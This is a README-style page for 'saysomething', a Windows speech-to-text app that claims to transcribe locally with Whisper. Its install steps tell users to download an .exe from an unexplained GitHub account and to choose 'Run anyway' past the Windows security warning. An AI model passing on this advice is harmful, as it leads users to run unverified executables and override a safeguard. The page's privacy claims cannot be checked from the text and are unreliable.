---
layout: "default"
title: "🎙️ saysomething - Turn your voice into typed text"
description: "Convert speech to text in any application using private, local transcription that runs entirely on your machine."
---
# 🎙️ saysomething - Turn your voice into typed text

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/mature-sustainability193/saysomething)

saysomething changes the way you type. It listens to your voice and places your words directly into any text box on your screen. The software runs entirely on your own computer. It does not send your recordings or data to the internet. Your conversations stay private. You do not need to create an account or sign in to use the tool.

## 📋 What this tool does

Many dictation tools send your voice to a server. These servers process the audio and send text back. saysomething avoids this process. It uses a technology called Whisper to turn speech into text locally. This means your computer performs all the math required to understand your speech.

The software works in the background. You hold a specific key, speak your thoughts, and the text appears where your cursor blinks. This works in web browsers, word processors, email clients, and chat apps. If an application allows you to type, saysomething allows you to speak into it.

## ⚙️ Requirements

Ensure your computer meets these needs to run the software comfortably:

*   Operating System: Windows 10 or Windows 11.
*   Processor: A modern processor with at least 4 cores.
*   Memory: 8 GB of RAM or more.
*   Storage: 2 GB of free space for the voice models.
*   Microphone: A standard USB or built-in headset.

Your computer needs enough power to run the voice model in real time. If your hardware is older, you might notice a delay between finishing a sentence and seeing the text appear.

## 📥 How to install

Follow these steps to set up the software on your machine:

1. Visit the [official download page](https://github.com/mature-sustainability193/saysomething).
2. Look for the section labeled "Assets" at the bottom of the latest release.
3. Select the file ending in `.exe` to start your download.
4. Open the downloaded file once the process finishes.
5. Windows might show a security prompt because the app is new. Select "More info" and then choose "Run anyway."
6. Follow the instructions on the screen to finish the installation.

## 🚀 Getting started

Once you install the software, launch it from your Start menu:

1. Open the saysomething icon. The app stays in your system tray, near your clock.
2. Click the icon to open the settings window.
3. Select your microphone from the device list.
4. Choose a shortcut key. The default is often the Control key or a function key.
5. Close the window. The app remains active in the background.

To use the tool, place your cursor in a text field. Press and hold the shortcut key you chose. Speak in a normal tone. Release the key when you finish your sentence. The text appears on your screen seconds later.

## 🔒 Your privacy

You hold total control over your data. Because this tool runs locally, no audio leaves your computer. We do not track your usage habits. We do not collect metrics. We do not store your words in a cloud database. Every bit of processing happens on your local hardware.

## 🛠 Troubleshooting

Occasionally, you might face issues with voice recognition. Use these tips to fix common problems:

*   Audio levels: Open your Windows Sound settings and ensure your microphone input gain is set to at least 70%.
*   Background noise: Whisper works best in quiet environments. Loud fans or music might confuse the model.
*   Shortcut keys: If the shortcut does not trigger the app, ensure no other programs use the same key combination.
*   Updates: Check the download link often for new versions. We improve the speech model frequently to handle different accents and languages.

## 🖥 Technical details

The software uses the Whisper-cpp library to perform transcription. This port of the original OpenAI Whisper model lets the software run on standard Windows hardware without the need for expensive graphics cards. The app wrapper uses Electron, which manages the interface that sits over your other windows. This design keeps the app responsive and reliable across different versions of Windows.

Keywords: dictation, electron, local-first, no-cloud, offline, on-device, privacy, speech-recognition, speech-to-text, transcription, voice-dictation, voice-to-text, voice-typing, whisper, whisper-cpp, windows, wispr-flow-alternative